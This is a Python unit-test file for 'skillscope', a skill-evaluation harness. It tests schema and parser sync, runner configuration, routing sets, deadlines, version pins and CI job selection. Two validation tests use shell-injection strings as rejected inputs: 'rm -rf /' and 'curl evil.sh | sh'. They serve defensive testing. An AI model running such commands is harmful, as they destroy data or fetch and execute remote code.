# Copyright Advanced Micro Devices, Inc.
#
# SPDX-License-Identifier: MIT

"""Tests for the harness itself. No agent, no tokens, no network.

    python -m unittest discover -s tests -t .

Three jobs. First, guard the parts that decide whether a paid run is
trustworthy: routing verdicts, activation detection, and the rules that reject
a malformed dataset. Second, keep the JSON Schema in lockstep with the parser
-- the schema is the field reference skill owners read, and one that has
quietly drifted from what the runner enforces is worse than no schema at all.
Third, hold the harness to being repo-agnostic, which is the whole reason it
lives in its own repo: every test that needs a repo builds a throwaway one in a
temp directory rather than reading whatever happens to be checked out here.
"""

from __future__ import annotations

import argparse
import contextlib
import io
import json
import os
import tempfile
import time
import unittest
import urllib.error
from pathlib import Path
from unittest import mock

from skillscope import (
    agent,
    behavior,
    cli,
    config,
    datasets,
    deadline,
    references,
    routing,
    structure,
)
from skillscope import select as select_module
from skillscope.datasets import EVALUATIONS_KEY, TRIGGER_KEY, VERSION_KEY

SCHEMA_DIR = datasets.PACKAGE_DIR / "schema"
TRIGGERING = "triggeringEvaluation"
NON_TRIGGERING = "nonTriggeringEvaluation"

BOOTSTRAP = Path(__file__).resolve().parent.parent / "bootstrap" / "resolve_version.py"


def parse(
    payload: dict, skill: str | None = "demo-skill", extended: bool = False
) -> tuple[list, list[str]]:
    """Run the dataset parser over an in-memory payload."""
    errors: list[str] = []
    with tempfile.TemporaryDirectory() as tmp:
        name = "extended_evals.json" if extended else "evals.json"
        source = Path(tmp) / name
        source.write_text(json.dumps(payload), encoding="utf-8")
        cases = datasets._parse_cases(payload, skill, source, errors, extended)
    return cases, errors


def triggers(**case) -> dict:
    """A dataset holding one evaluation that should fire the skill."""
    return {EVALUATIONS_KEY: [{TRIGGER_KEY: True, **case}]}


def triggers_nothing(**case) -> dict:
    """A dataset holding one evaluation where nothing should fire."""
    return {EVALUATIONS_KEY: [{TRIGGER_KEY: False, **case}]}


def tier0_dataset(slug: str, **extra) -> dict:
    """The smallest dataset that clears the mandatory coverage bar."""
    evaluations = [
        {"id": f"{slug}-yes-{i}", TRIGGER_KEY: True, "prompt": f"please do {slug} work {i}"}
        for i in range(datasets.MIN_POSITIVE_CASES)
    ]
    evaluations += [
        {"id": f"{slug}-no-{i}", TRIGGER_KEY: False, "prompt": f"nothing to do with {slug} {i}"}
        for i in range(datasets.MIN_NEGATIVE_CASES)
    ]
    return {EVALUATIONS_KEY: evaluations, **extra}


class Repo:
    """A throwaway repo laid out the way skillscope expects one.

    Every test that needs "a repo with skills in it" builds one of these. The
    harness is supposed to work against any repo, so reading the checkout it
    happens to be running from would test one repo's contents instead of the
    harness -- and would break the moment this code moved.
    """

    def __init__(self, test: unittest.TestCase) -> None:
        tmp = tempfile.TemporaryDirectory()
        test.addCleanup(tmp.cleanup)
        # Resolved, because the config does the same to whatever root it is
        # given: a Windows runner's temp directory arrives in its 8.3 form
        # (`RUNNER~1`), so an unresolved root here would compare unequal to the
        # very path the harness derived from it.
        self.root = Path(tmp.name).resolve()
        self.test = test
        self.settings: dict = {}

    def skill(
        self,
        name: str,
        *,
        dataset: dict | None = None,
        extended: dict | None = None,
        machine: str | None = None,
        hooks: str | None = None,
        workspace: dict[str, str] | None = None,
        description: str = "",
        where: str = ".",
    ) -> Path:
        folder = self.root / where / name
        (folder / "evals").mkdir(parents=True, exist_ok=True)
        (folder / "SKILL.md").write_text(
            f"---\nname: {name}\ndescription: {description or f'Does {name} things.'}\n---\n",
            encoding="utf-8",
        )
        if dataset is not None:
            (folder / "evals" / "evals.json").write_text(
                json.dumps(dataset, indent=2), encoding="utf-8"
            )
        if extended is not None:
            (folder / "evals" / "extended_evals.json").write_text(
                json.dumps(extended, indent=2), encoding="utf-8"
            )
        if machine is not None:
            (folder / "evals" / "machine.yml").write_text(machine, encoding="utf-8")
        if hooks is not None:
            (folder / "evals" / "hooks.py").write_text(hooks, encoding="utf-8")
        for relative, text in (workspace or {}).items():
            path = folder / relative
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(text, encoding="utf-8")
        # Skills added after activate() should be visible without re-activating:
        # the config resolves its globs on every read, and several tests grow
        # the repo mid-test to see what the structural checks make of the result.
        return folder

    def chdir(self, relative: str = ".") -> None:
        """Run the rest of the test from a directory inside this repo.

        Registered after the temp directory's own cleanup, so it is undone
        first: Windows will not remove a directory that is the cwd.
        """
        self.test.addCleanup(os.chdir, os.getcwd())
        os.chdir(self.root / relative)

    def activate(self, **settings) -> config.Config:
        """Configure the harness for this repo the way the CLI's flags would."""
        self.settings = settings
        cfg = config.build(self.root, **settings)
        previous = config.use(cfg)
        self.test.addCleanup(config.use, previous)
        return cfg

    def reactivate(self, **overrides) -> config.Config:
        """Re-activate with `overrides` applied, for a test that changes one setting."""
        return self.activate(**{**self.settings, **overrides})


class TestSchemaStaysInSyncWithParser(unittest.TestCase):
    """The schema is documentation; these tests stop it becoming fiction."""

    def setUp(self) -> None:
        self.schema = json.loads(
            (SCHEMA_DIR / "evals.schema.json").read_text(encoding="utf-8")
        )

    def defs(self, name: str) -> dict:
        return self.schema["$defs"][name]

    def test_top_level_properties_match_parser(self) -> None:
        self.assertEqual(set(self.schema["properties"]), datasets.DATASET_KEYS)

    def test_the_harness_version_pin_is_documented(self) -> None:
        # It is the one field that changes which code grades a dataset, so an
        # undocumented one would be invisible to the owners who set it.
        self.assertIn(VERSION_KEY, self.schema["properties"])

    def test_triggering_properties_match_parser(self) -> None:
        self.assertEqual(
            set(self.defs(TRIGGERING)["properties"]), datasets.TRIGGER_CASE_KEYS
        )

    def test_non_triggering_properties_match_parser(self) -> None:
        self.assertEqual(
            set(self.defs(NON_TRIGGERING)["properties"]), datasets.NO_TRIGGER_CASE_KEYS
        )

    def test_the_flag_is_required_and_discriminates_the_two_shapes(self) -> None:
        for name, value in ((TRIGGERING, True), (NON_TRIGGERING, False)):
            with self.subTest(name):
                self.assertEqual(self.defs(name)["required"], ["id", "prompt", TRIGGER_KEY])
                self.assertEqual(self.defs(name)["properties"][TRIGGER_KEY]["const"], value)

    def test_unknown_keys_are_rejected_by_both(self) -> None:
        for name in (TRIGGERING, NON_TRIGGERING):
            with self.subTest(name):
                self.assertFalse(self.defs(name)["additionalProperties"])
        _, errors = parse(triggers(id="a", prompt="p", expect_skill="demo-skill"))
        self.assertTrue(any("unknown key" in e for e in errors), errors)


class TestMachineSchema(unittest.TestCase):
    """A bad machine.yml means a job that never schedules, so catch it here."""

    def setUp(self) -> None:
        self.schema = json.loads(
            (SCHEMA_DIR / "machine.schema.json").read_text(encoding="utf-8")
        )
        self.repo = Repo(self)
        self.repo.skill("plain-skill", dataset=tier0_dataset("plain"))
        self.repo.skill(
            "gpu-skill",
            dataset=tier0_dataset("gpu"),
            machine="os: [Linux]\nlabels: [mi300x]\n",
        )
        self.repo.activate(
            behavior_runner=["self-hosted", "strix_halo"],
            behavior_os=["Linux", "Windows"],
            scoped_runner=["self-hosted"],
            scoped_gate="enable_mi_ci",
            scoped_environment="behavioral-instinct",
        )

    def test_documented_keys_match_the_parser(self) -> None:
        self.assertEqual(set(self.schema["properties"]), datasets.MACHINE_KEYS)

    def test_neither_key_is_enumerated_in_the_schema(self) -> None:
        # Neither can be: a label means whatever a repo registered its runners
        # with, so the schema documents what the key is for and the workflow
        # supplies the labels around it.
        for key in datasets.MACHINE_KEYS:
            with self.subTest(key=key):
                self.assertNotIn("enum", self.schema["properties"][key]["items"])

    def test_every_machine_yml_in_the_repo_resolves(self) -> None:
        for skill in datasets.declared_skills():
            with self.subTest(skill=skill):
                self.assertTrue(datasets.machine_plan(skill)["os"])

    def test_a_skill_without_the_file_gets_the_everyday_runners(self) -> None:
        plan = datasets.machine_plan("plain-skill")
        self.assertEqual(plan["os"], ["Linux", "Windows"])
        self.assertEqual(plan["labels"], [])
        self.assertEqual(
            select_module.runs_on(plan, "Windows"),
            ["self-hosted", "strix_halo", "Windows"],
        )

    def test_asking_for_a_label_lands_the_leg_on_the_scoped_pool(self) -> None:
        # The skill names the hardware it needs and nothing else. The base
        # labels, the label rationing the pool, and the environment holding its
        # key belong to the repo that owns the machines.
        self.assertEqual(
            datasets._read_machine("gpu-skill"), {"os": ["Linux"], "labels": ["mi300x"]}
        )
        plan = datasets.machine_plan("gpu-skill")
        self.assertEqual(plan["os"], ["Linux"])
        self.assertEqual(
            select_module.runs_on(plan, "Linux"), ["self-hosted", "mi300x", "Linux"]
        )

    def test_a_label_is_not_repeated(self) -> None:
        # A pool registered with the platform in its label set keeps exactly the
        # labels it has.
        plan = {"os": ["Linux"], "labels": ["Linux", "mi300x"]}
        self.assertEqual(
            select_module.runs_on(plan, "Linux"), ["self-hosted", "Linux", "mi300x"]
        )


class TestMachineRejections(unittest.TestCase):
    """Failing at planning beats scheduling a job onto a pool that has no runners."""

    def setUp(self) -> None:
        self.repo = Repo(self)
        self.repo.skill("demo-skill", dataset=tier0_dataset("demo"))
        self.repo.activate(behavior_os=["Linux", "Windows"])

    def plan(self, text: str) -> dict:
        path = self.repo.root / "demo-skill" / "evals" / "machine.yml"
        path.write_text(text, encoding="utf-8")
        return datasets.machine_plan("demo-skill")

    def test_a_retired_key_is_rejected_rather_than_ignored(self) -> None:
        # `runner_type`, `runner`, `gate`, `environment`, and `reason` all used
        # to live here. Silently dropping one would leave a skill on the wrong
        # hardware, or run scarce hardware with no gate.
        for text in (
            "runner_type: instinct\n",
            "gate: enable_mi_ci\n",
            "environment: behavioral-instinct\n",
            "reason: because\n",
            "runner: [a, b]\n",
        ):
            with self.subTest(text.strip()), self.assertRaises(SystemExit) as caught:
                self.plan(text)
            self.assertIn("unknown key", str(caught.exception))

    def test_an_empty_os_list(self) -> None:
        with self.assertRaises(SystemExit) as caught:
            self.plan("os: []\n")
        self.assertIn("`os`", str(caught.exception))

    def test_an_empty_label_list(self) -> None:
        # Asking for hardware and naming none is a leg that would silently land
        # back on the everyday pool.
        with self.assertRaises(SystemExit) as caught:
            self.plan("labels: []\n")
        self.assertIn("`labels`", str(caught.exception))

    def test_a_label_that_is_not_a_string(self) -> None:
        with self.assertRaises(SystemExit) as caught:
            self.plan("labels: mi300x\n")
        self.assertIn("`labels`", str(caught.exception))

    def test_the_minimum_useful_files(self) -> None:
        self.assertEqual(self.plan("os: [Linux]\n")["os"], ["Linux"])
        labelled = self.plan("labels: [mi300x]\n")
        self.assertEqual(labelled["labels"], ["mi300x"])
        # Saying nothing about platforms still means the repo's platforms.
        self.assertEqual(labelled["os"], ["Linux", "Windows"])

    def test_structural_checks_report_a_broken_machine_file_rather_than_raising(self) -> None:
        # `skillscope structural` has to survey every skill, so one bad file is
        # a reported error, not an abandoned run.
        (self.repo.root / "demo-skill" / "evals" / "machine.yml").write_text(
            "labels: nope\n", encoding="utf-8"
        )
        self.assertTrue(any("`labels`" in e for e in datasets.structural_errors()))


class TestConfig(unittest.TestCase):
    """The repo under test is data, and this is how the flags describe it."""

    def test_a_repo_that_configures_nothing_still_works(self) -> None:
        repo = Repo(self)
        repo.skill("demo-skill", dataset=tier0_dataset("demo"))
        repo.chdir()
        cfg = repo.activate()
        self.assertEqual(cfg.skill_globs, config.DEFAULT_SKILL_GLOBS)
        self.assertEqual(cfg.routing_skills, ())
        self.assertEqual(datasets.declared_skills(), ["demo-skill"])

    def test_skills_can_live_anywhere_the_globs_say(self) -> None:
        repo = Repo(self)
        repo.skill("shipped", dataset=tier0_dataset("shipped"), where="agents/skills")
        repo.activate(skills_dir="agents/skills/*")
        self.assertEqual(datasets.declared_skills(), ["shipped"])
        self.assertTrue(datasets.dataset_path("shipped").is_file())

    def test_the_default_looks_one_level_down_and_no_further(self) -> None:
        # Deep enough for a repo that keeps its skills where you are standing,
        # shallow enough that a vendored copy further down is not found and
        # silently graded.
        repo = Repo(self)
        repo.skill("at-the-root", dataset=tier0_dataset("root"))
        repo.skill("buried", dataset=tier0_dataset("buried"), where="vendor/skills")
        repo.chdir()
        repo.activate()
        self.assertEqual(datasets.declared_skills(), ["at-the-root"])

    def test_the_default_is_the_directory_the_command_was_run_from(self) -> None:
        # A repo whose skills sit a level down is the usual layout, and
        # `cd skills && skillscope structural` is what a person does about it.
        # The glob is still reported against the root, which is the base every
        # other path in a run is measured from.
        repo = Repo(self)
        repo.skill("shipped", dataset=tier0_dataset("shipped"), where="skills")
        repo.chdir("skills")
        cfg = repo.activate()
        self.assertEqual(cfg.skill_globs, ("skills/*",))
        self.assertEqual(datasets.declared_skills(), ["shipped"])

    def test_a_command_run_from_outside_the_repo_gets_that_repos_root(self) -> None:
        # `--repo somewhere-else` is not standing anywhere in it, so the only
        # directory it can mean is the root it was handed.
        repo = Repo(self)
        repo.skill("at-the-root", dataset=tier0_dataset("root"))
        self.assertEqual(repo.activate().skill_globs, config.DEFAULT_SKILL_GLOBS)
        self.assertEqual(datasets.declared_skills(), ["at-the-root"])

    def test_a_glob_that_was_passed_is_relative_to_the_root_not_the_cwd(self) -> None:
        # Every other path flag is root-relative, and a workflow that names
        # `skills/*` means the same thing wherever its runner happens to be.
        repo = Repo(self)
        repo.skill("shipped", dataset=tier0_dataset("shipped"), where="skills")
        repo.chdir("skills")
        repo.activate(skills_dir="skills/*")
        self.assertEqual(datasets.declared_skills(), ["shipped"])

    def test_a_directory_without_a_skill_file_is_not_a_skill(self) -> None:
        repo = Repo(self)
        repo.skill("real-skill", dataset=tier0_dataset("real"))
        (repo.root / "notes").mkdir(parents=True)
        repo.activate()
        self.assertEqual(datasets.declared_skills(), ["real-skill"])

    def test_an_unknown_skill_names_what_is_available(self) -> None:
        repo = Repo(self)
        repo.skill("real-skill", dataset=tier0_dataset("real"))
        repo.activate()
        with self.assertRaises(SystemExit) as caught:
            datasets.skill_path("ghost")
        self.assertIn("real-skill", str(caught.exception))

    def test_a_list_can_be_json_or_comma_separated(self) -> None:
        # runs-on labels are a JSON array everywhere else in a workflow, so
        # making the caller translate them on the way in is how a label ends up
        # with a stray bracket in it.
        repo = Repo(self)
        for value in ('["self-hosted", "strix_halo"]', "self-hosted,strix_halo"):
            with self.subTest(value=value):
                cfg = config.build(repo.root, behavior_runner=value)
                self.assertEqual(cfg.behavior_runner, ("self-hosted", "strix_halo"))

    def test_a_malformed_list_names_the_flag_that_was_wrong(self) -> None:
        repo = Repo(self)
        for value in ("[oops", '{"a": 1}', "[1, 2]", "a,,b"):
            with self.subTest(value=value):
                with self.assertRaises(SystemExit) as caught:
                    config.build(repo.root, behavior_runner=value)
                self.assertIn("--behavior-runner", str(caught.exception))

    def test_the_skill_globs_can_come_from_the_environment(self) -> None:
        # The launcher needs the same answer before the harness exists, so it
        # passes them this way; the flag still wins.
        repo = Repo(self)
        repo.skill("shipped", dataset=tier0_dataset("shipped"), where="agents/skills")
        with mock.patch.dict(os.environ, {config.SKILLS_ENV: "agents/skills/*"}):
            self.assertEqual(config.build(repo.root).skill_globs, ("agents/skills/*",))
            self.assertEqual(
                config.build(repo.root, skills_dir="skills/*").skill_globs,
                ("skills/*",),
            )

    def test_the_version_comes_from_the_environment_when_unset(self) -> None:
        repo = Repo(self)
        with mock.patch.dict(os.environ, {config.VERSION_ENV: "v9.9.9"}):
            self.assertEqual(config.build(repo.root).version, "v9.9.9")
            self.assertEqual(config.build(repo.root, version="").version, "")


class TestRoutingSet(unittest.TestCase):
    """Who a skill competes against is listed, never inferred."""

    def setUp(self) -> None:
        self.repo = Repo(self)
        self.repo.skill("one", dataset=tier0_dataset("one"))
        self.repo.skill("two", dataset=tier0_dataset("two"))

    def test_the_listed_skills_are_what_gets_installed(self) -> None:
        cfg = self.repo.activate(routing_skills="one,two")
        self.assertEqual(list(cfg.routing_set), ["one", "two"])
        self.assertEqual(cfg.routing_set["one"], self.repo.root / "one")

    def test_an_unlisted_skill_is_not_in_the_room(self) -> None:
        cfg = self.repo.activate(routing_skills="one")
        self.assertEqual(list(cfg.routing_set), ["one"])

    def test_listing_nothing_where_there_is_a_choice_means_no_routing_run(self) -> None:
        cfg = self.repo.activate(dataset_skills=["one", "two"])
        self.assertEqual(cfg.routing_set, {})
        plan = select_module.plan(["one"], routing=True, labels=set())
        self.assertFalse(plan["routing"])

    def test_all_stands_for_every_skill_with_a_dataset(self) -> None:
        # Resolved by the CLI, which is where "has a dataset" can be answered.
        cfg = config.build(
            self.repo.root,
            routing_skills="all",
            dataset_skills=["one", "two"],
        )
        self.assertEqual(cfg.routing_skills, ("one", "two"))

    def test_none_says_no_routing_run_outright(self) -> None:
        # The one way to turn routing off, and it survives a repo having only
        # one skill -- which is otherwise enough to infer a room.
        for available in (["one"], ["one", "two"]):
            with self.subTest(available=available):
                cfg = config.build(
                    self.repo.root, routing_skills="none", dataset_skills=available
                )
                self.assertEqual(cfg.routing_skills, ())

    def test_a_skill_that_does_not_exist_is_refused(self) -> None:
        cfg = self.repo.activate(routing_skills="one,ghost")
        with self.assertRaises(SystemExit) as caught:
            cfg.routing_set  # noqa: B018 -- the property is the assertion
        self.assertIn("ghost", str(caught.exception))

    def test_the_listed_order_is_kept(self) -> None:
        cfg = self.repo.activate(routing_skills="two,one")
        self.assertEqual(list(cfg.routing_set), ["two", "one"])


class TestASingleSkillIsItsOwnRoom(unittest.TestCase):
    """One skill with a dataset is not a choice, so nothing has to be made."""

    def setUp(self) -> None:
        self.repo = Repo(self)
        self.repo.skill("only-skill", dataset=tier0_dataset("only"))

    def resolve(self, **settings) -> config.Config:
        """Configure in two passes, the way the CLI does.

        Which skills ship a dataset is a question about the repo, so it can
        only be answered once the repo is readable.
        """
        self.repo.activate(**settings)
        return self.repo.reactivate(dataset_skills=datasets.skills_with_datasets())

    def test_the_only_skill_with_a_dataset_is_the_room(self) -> None:
        self.assertEqual(list(self.resolve().routing_set), ["only-skill"])

    def test_it_is_the_room_for_planning_too(self) -> None:
        # Otherwise the flag would be redundant on the runner and still
        # required for CI to schedule the job that runs it.
        self.resolve(infra_paths=".github/workflows/evals.yml")
        self.assertTrue(select_module.routing_needed({"only-skill/SKILL.md"}))
        self.assertTrue(
            select_module.plan(["only-skill"], routing=True, labels=set())["routing"]
        )

    def test_a_second_skill_makes_it_a_choice_again(self) -> None:
        self.repo.skill("neighbour", dataset=tier0_dataset("neighbour"))
        self.assertEqual(self.resolve().routing_set, {})

    def test_a_skill_without_a_dataset_is_not_a_candidate(self) -> None:
        # It has no prompts, so it could not be graded in the room it would
        # otherwise make ambiguous.
        self.repo.skill("undocumented")
        self.assertEqual(list(self.resolve().routing_set), ["only-skill"])

    def test_saying_none_still_turns_routing_off(self) -> None:
        cfg = self.resolve(routing_skills="none")
        self.assertEqual(cfg.routing_set, {})
        self.assertFalse(
            select_module.plan(["only-skill"], routing=True, labels=set())["routing"]
        )

    def test_the_cli_resolves_the_room_before_the_command_runs(self) -> None:
        # Through the flags, because the two-pass configure in the CLI is what
        # turns "said nothing" into the one skill there is.
        self.repo.activate()  # registers the cleanup that restores the config
        cli._configure(
            cli.build_parser().parse_args(
                ["--repo", str(self.repo.root), "routing"]
            )
        )
        self.assertEqual(config.active().routing_skills, ("only-skill",))


class TestARoutingRunWithNobodyInTheRoom(unittest.TestCase):
    """What `routing` does when the routing set comes out empty."""

    def setUp(self) -> None:
        self.repo = Repo(self)
        self.repo.skill("one", dataset=tier0_dataset("one"))
        self.repo.skill("two", dataset=tier0_dataset("two"))
        self.repo.activate()

    def args(self, *argv) -> argparse.Namespace:
        return cli.build_parser().parse_args(["routing", *argv])

    def test_a_repo_with_a_choice_to_make_is_told_what_its_options_are(self) -> None:
        with self.assertRaises(SystemExit) as caught:
            cli._empty_room(self.args())
        message = str(caught.exception)
        for expected in ("all", "one, two"):
            self.assertIn(expected, message)

    def test_asking_for_routing_and_emptying_the_room_is_a_contradiction(self) -> None:
        with self.assertRaises(SystemExit) as caught:
            cli._empty_room(self.args("--routing-skills", "none"))
        self.assertIn("--routing-skills none", str(caught.exception))


class TestCommands(unittest.TestCase):
    """The three graders are commands, not modes of run."""

    def test_structural_routing_and_behavioral_are_commands(self) -> None:
        parser = cli.build_parser()
        for command in ("structural", "routing", "behavioral"):
            with self.subTest(command):
                self.assertEqual(parser.parse_args([command]).command, command)

    def test_run_is_not_a_command(self) -> None:
        with contextlib.redirect_stderr(io.StringIO()):
            with self.assertRaises(SystemExit):
                cli.build_parser().parse_args(["run"])

    def test_neither_grader_has_a_mode_flag(self) -> None:
        for command in ("routing", "behavioral"):
            with self.subTest(command):
                self.assertFalse(hasattr(cli.build_parser().parse_args([command]), "mode"))

    def test_behavioral_does_not_take_routing_flags(self) -> None:
        with contextlib.redirect_stderr(io.StringIO()):
            with self.assertRaises(SystemExit):
                cli.build_parser().parse_args(["behavioral", "--routing-skills", "all"])
            with self.assertRaises(SystemExit):
                cli.build_parser().parse_args(["behavioral", "--min-accuracy", "0"])

    def test_the_three_graders_share_a_timeout(self) -> None:
        parser = cli.build_parser()
        for command in ("structural", "routing", "behavioral"):
            with self.subTest(command):
                args = parser.parse_args([command])
                self.assertEqual(args.timeout, 900.0)

    def test_routing_keeps_a_separate_case_timeout(self) -> None:
        args = cli.build_parser().parse_args(["routing"])
        self.assertEqual(args.timeout, 900.0)
        self.assertEqual(args.case_timeout, 240.0)

    def test_select_does_not_take_a_timeout(self) -> None:
        args = cli.build_parser().parse_args(["select", "--all"])
        self.assertFalse(hasattr(args, "timeout"))


class TestDeadline(unittest.TestCase):
    """The command-level --timeout, distinct from a routing case's own cap."""

    def test_cap_is_the_tighter_bound(self) -> None:
        bound = deadline.Deadline(10, command="routing", start=time.perf_counter() - 6)
        self.assertAlmostEqual(bound.cap(30), 4, places=1)
        self.assertAlmostEqual(bound.cap(2), 2, places=1)

    def test_an_elapsed_bound_is_expired(self) -> None:
        bound = deadline.Deadline(1, command="routing", start=time.perf_counter() - 2)
        self.assertTrue(bound.expired())
        self.assertEqual(bound.cap(240), 0.0)
        self.assertIn("--timeout of 1s", bound.message())

    def test_an_expired_deadline_does_not_start_a_routing_case(self) -> None:
        cases, errors = parse(triggers(id="hung", prompt="go"))
        self.assertEqual(errors, [])
        bound = deadline.Deadline(1, command="routing", start=time.perf_counter() - 2)
        previous = deadline.use(bound)
        try:
            outcome = routing.run_case(
                cases[0], {"demo-skill": Path(".")}, routing.RoutingConfig()
            )
        finally:
            deadline.use(previous)
        self.assertEqual(outcome.verdict, "error")
        self.assertEqual(outcome.stop_reason, "timeout")
        self.assertIn("routing exceeded --timeout", outcome.error)

    def test_an_expired_deadline_does_not_start_a_behavioral_case(self) -> None:
        cases, errors = parse(triggers(id="hung", prompt="go", logs_contain=["x"]))
        self.assertEqual(errors, [])
        bound = deadline.Deadline(1, command="behavioral", start=time.perf_counter() - 2)
        previous = deadline.use(bound)
        try:
            outcome = behavior.run_case(cases[0], {}, None, "opus", "high")
        finally:
            deadline.use(previous)
        self.assertFalse(outcome.passed)
        self.assertIn("behavioral exceeded --timeout", outcome.error)


class TestHarnessVersionPin(unittest.TestCase):
    """Which build of the harness grades a dataset is data, in a reviewable diff."""

    def setUp(self) -> None:
        self.repo = Repo(self)
        self.repo.skill("pinned-skill", dataset=tier0_dataset("pinned", skillscope_version="v1.2.0"))
        self.repo.skill("unpinned-skill", dataset=tier0_dataset("unpinned"))
        self.repo.activate(version="v1.0.0")

    def test_a_dataset_pin_wins_for_that_skill(self) -> None:
        self.assertEqual(datasets.pinned_version("pinned-skill"), "v1.2.0")

    def test_an_unpinned_skill_falls_back_to_the_running_version(self) -> None:
        self.assertEqual(datasets.pinned_version("unpinned-skill"), "v1.0.0")

    def test_routing_uses_the_running_version(self) -> None:
        # Routing installs several skills in one session, so it cannot honor
        # several per-skill pins at once.
        self.assertEqual(datasets.pinned_version(), "v1.0.0")

    def test_the_pin_is_not_mistaken_for_an_evaluation_key(self) -> None:
        cases, errors = parse(tier0_dataset("demo", skillscope_version="main"))
        self.assertEqual(errors, [])
        self.assertEqual(len(cases), 5)

    def test_a_pin_that_is_not_a_git_ref_is_rejected(self) -> None:
        _, errors = parse(tier0_dataset("demo", skillscope_version="v1 or so; rm -rf /"))
        self.assertTrue(any(VERSION_KEY in e for e in errors), errors)

    def test_a_non_string_pin_is_rejected(self) -> None:
        _, errors = parse(tier0_dataset("demo", skillscope_version=1.2))
        self.assertTrue(any(VERSION_KEY in e for e in errors), errors)

    def test_select_emits_the_version_per_leg(self) -> None:
        self.repo.skill(
            "behaving-skill",
            dataset=tier0_dataset(
                "behaving",
                skillscope_version="v3.0.0",
            )
            | {
                EVALUATIONS_KEY: tier0_dataset("behaving")[EVALUATIONS_KEY]
                + [
                    {
                        "id": "behaving-graded",
                        TRIGGER_KEY: True,
                        "prompt": "do the thing",
                        "logs_contain": ["thing.py"],
                    }
                ]
            },
        )
        plan = select_module.plan(["behaving-skill"], routing=True, labels=set())
        self.assertEqual(plan["version"], "v1.0.0")
        self.assertEqual([leg["version"] for leg in plan["default"]], ["v3.0.0"])


class TestBootstrapResolver(unittest.TestCase):
    """The launcher reads the pin without importing the harness it launches."""

    def setUp(self) -> None:
        import importlib.util

        spec = importlib.util.spec_from_file_location("resolve_version", BOOTSTRAP)
        self.module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(self.module)
        self.repo = Repo(self)
        self.repo.skill("demo-skill", dataset=tier0_dataset("demo", skillscope_version="v2.0.0"))

    def resolve(self, **kwargs) -> str:
        return self.module.resolve(root=self.repo.root, **kwargs)

    def test_an_explicit_version_wins(self) -> None:
        self.assertEqual(self.resolve(requested="v9", env="v8", skill="demo-skill"), "v9")

    def test_the_environment_comes_next(self) -> None:
        self.assertEqual(self.resolve(requested="", env="v8", skill="demo-skill"), "v8")

    def test_then_the_skill_that_is_being_run(self) -> None:
        self.assertEqual(self.resolve(requested="", env="", skill="demo-skill"), "v2.0.0")

    def test_a_repo_that_pins_nothing_falls_back_to_the_launcher_ref(self) -> None:
        empty = Repo(self)
        self.assertEqual(
            self.module.resolve(root=empty.root, requested="", env="", skill="", default="bootstrap"),
            "bootstrap",
        )

    def test_with_no_pin_and_no_default_it_says_so(self) -> None:
        empty = Repo(self)
        with self.assertRaises(SystemExit) as caught:
            self.module.resolve(root=empty.root, requested="", env="", skill="", default="")
        self.assertIn("version", str(caught.exception))

    def test_it_finds_a_skill_under_the_globs_it_is_given(self) -> None:
        repo = Repo(self)
        repo.skill("odd-place", dataset=tier0_dataset("odd", skillscope_version="v4"), where="agents")
        self.assertEqual(
            self.module.resolve(
                root=repo.root, requested="", env="", skill="odd-place", globs=["agents/*"]
            ),
            "v4",
        )

    def test_a_ref_that_could_be_a_shell_injection_is_refused(self) -> None:
        # The result is interpolated into a `uvx --from git+...@REF` command.
        with self.assertRaises(SystemExit):
            self.resolve(requested="v1; curl evil.sh | sh", env="", skill="")


class TestSelection(unittest.TestCase):
    """What CI runs for a change, and what it is right to skip."""

    def setUp(self) -> None:
        self.repo = Repo(self)
        self.graded = tier0_dataset("alpha")
        self.graded[EVALUATIONS_KEY].append(
            {
                "id": "alpha-graded",
                TRIGGER_KEY: True,
                "prompt": "do it",
                "logs_contain": ["alpha.py"],
            }
        )
        self.repo.skill("alpha", dataset=self.graded)
        self.repo.skill("beta", dataset=tier0_dataset("beta"))
        self.repo.activate(
            routing_skills="alpha,beta",
            infra_paths=".github/workflows/evals.yml",
        )

    def gpu(self, skill: str = "alpha") -> None:
        """Give `skill` a machine.yml asking for hardware this repo rations."""
        (self.repo.root / skill / "evals" / "machine.yml").write_text(
            "labels: [gpu]\n", encoding="utf-8"
        )
        self.repo.reactivate(
            scoped_runner="self-hosted",
            scoped_gate="enable_gpu_ci",
            scoped_environment="gpu-evals",
        )

    def test_only_skills_with_gradeable_behavior_get_a_leg(self) -> None:
        plan = select_module.plan(["alpha", "beta"], routing=True, labels=set())
        self.assertEqual([leg["skill"] for leg in plan["default"]], ["alpha"])

    def test_a_touched_skill_is_selected(self) -> None:
        self.assertEqual(
            select_module.select_from_changes({"alpha/SKILL.md"}), ["alpha"]
        )

    def test_an_infra_path_selects_everything(self) -> None:
        # The workflow holds the routing set and the version pin, so a change
        # to it can move any result.
        self.assertEqual(
            select_module.select_from_changes({".github/workflows/evals.yml"}),
            ["alpha", "beta"],
        )

    def test_an_unrelated_change_selects_nothing(self) -> None:
        self.assertEqual(select_module.select_from_changes({"README.md"}), [])

    def test_a_description_change_buys_a_routing_run(self) -> None:
        self.assertTrue(select_module.routing_needed({"alpha/SKILL.md"}))

    def test_a_dataset_change_buys_a_routing_run(self) -> None:
        self.assertTrue(select_module.routing_needed({"beta/evals/evals.json"}))

    def test_a_reference_file_under_a_skill_does_not(self) -> None:
        self.assertFalse(select_module.routing_needed({"alpha/reference.md"}))

    def test_an_unlisted_skills_description_is_not_a_routing_input(self) -> None:
        self.repo.skill("draft", dataset=tier0_dataset("draft"))
        self.assertFalse(select_module.routing_needed({"draft/SKILL.md"}))

    def test_with_no_routing_set_nothing_buys_a_routing_run(self) -> None:
        self.repo.reactivate(routing_skills="")
        self.assertFalse(select_module.routing_needed({"alpha/SKILL.md"}))
        self.assertFalse(
            select_module.routing_needed({".github/workflows/evals.yml"})
        )

    def test_a_gated_leg_is_reported_rather_than_run(self) -> None:
        self.gpu()

        held = select_module.plan(["alpha"], routing=False, labels=set())
        self.assertEqual(held["default"], [])
        self.assertEqual(held["scoped"], [])
        self.assertEqual(held["skipped"], [{"skill": "alpha", "gate": "enable_gpu_ci"}])
        self.assertEqual(held["gates"], ["enable_gpu_ci"])

        labelled = select_module.plan(["alpha"], routing=False, labels={"enable_gpu_ci"})
        self.assertEqual(labelled["skipped"], [])
        self.assertEqual(len(labelled["scoped"]), 1)
        self.assertEqual(labelled["scoped"][0]["environment"], "gpu-evals")
        self.assertEqual(
            json.loads(labelled["scoped"][0]["runner"]),
            ["self-hosted", "gpu", "Linux"],
        )

